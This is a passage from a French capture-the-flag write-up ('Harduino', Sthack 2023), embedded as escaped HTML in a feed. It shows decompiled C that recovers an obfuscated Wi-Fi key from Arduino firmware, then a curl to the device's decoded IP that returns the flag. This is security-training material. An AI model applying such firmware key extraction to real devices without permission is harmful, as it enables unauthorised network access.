&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
          &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r1_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
              &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cle_wifi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
              &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r1_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r1_12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cle_wifi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
              &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3_9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
              &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                  &lt;span class=&quot;n&quot;&gt;r3_9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
              &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
              &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                  &lt;span class=&quot;n&quot;&gt;r3_9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
              &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
              &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                  &lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
              &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
              &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r1_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r1_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r1_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Une commande gcc plus tard nous rÃ©cupÃ©rons la clÃ© Wi-Fi.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./decode_cle 
Z6a[[Pb&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;H?N+&amp;lt;c&amp;amp;-.qYA#?# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;rÃ©cupÃ©ration-du-flag&quot;&gt;RÃ©cupÃ©ration du flag&lt;/h2&gt;

&lt;p&gt;Alors nous ouvrons le gestionnaire de Wi-Fi mais sans trouver le SSID MyAccessPoint. Est-il cachÃ© ? Eh bien non, il suffisait juste de se balader dans la mairie pour le trouver. Une fois a portÃ© nous pouvons nous connecter. Reste-t-il Ã  savoir que faire une fois connectÃ©.&lt;/p&gt;

&lt;p&gt;En analysant la suite du code on peut retrouver une rÃ©ponse HTTP:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/http.png&quot; alt=&quot;http&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Il nous faut donc trouver lâ€™adresse IP de lâ€™Arduino sur le rÃ©seau. Pour cela on peut revenir dans la fonction setup et chercher la mÃ©thode associÃ©e.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;arduino&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IPAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IPAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On y retrouve lâ€™adresse suivante une fois dÃ©codÃ©e : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.4.42&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Un curl et le flag est Ã  nous&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl 192.168.4.42
Welcome to the flag provider 
The flag is: STHACK&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;H@rdU1n0_107_MuCh_FuN&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bingo :sparkles:&lt;/p&gt;</content><author><name></name></author><category term="Sthack-2023" /><summary type="html">Harduino writeup</summary></entry></feed>